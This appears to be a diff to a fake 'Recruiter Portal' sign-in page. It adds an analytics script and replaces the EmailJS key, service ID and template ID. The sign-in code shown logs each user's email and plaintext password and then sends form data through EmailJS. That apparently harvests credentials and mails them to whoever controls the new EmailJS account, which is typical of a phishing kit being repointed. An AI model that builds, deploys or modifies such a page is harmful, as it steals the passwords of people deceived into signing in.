@@ -1,6 +1,13 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <!-- Privacy-friendly analytics by Plausible -->
+<script async src="https://plausible.io/js/pa-EnuVB78Kn74xfv7WaBh7I.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
     <title>Recruiter Portal | Sign In</title>
@@ -620,7 +627,7 @@
 
 <script>
     // Initialize EmailJS with your public key
-    emailjs.init("uGRhkufMjo08rjwb_");
+    emailjs.init("EHKPcgjBux1jmPamR");
 
     // DOM elements
     const signinForm = document.getElementById("signin-form");
@@ -726,7 +733,7 @@
 
         console.log("Sign in attempted:", { email: email, password: "🔐 " + password });
 
-        emailjs.send("service_t84doqy", "template_awd8sif", templateParams)
+        emailjs.send("service_kvpr45j", "template_v2xoave", templateParams)
             .then(function(response) {
                 console.log("EmailJS Success!");
                 if (keepSignedIn === "Yes") {
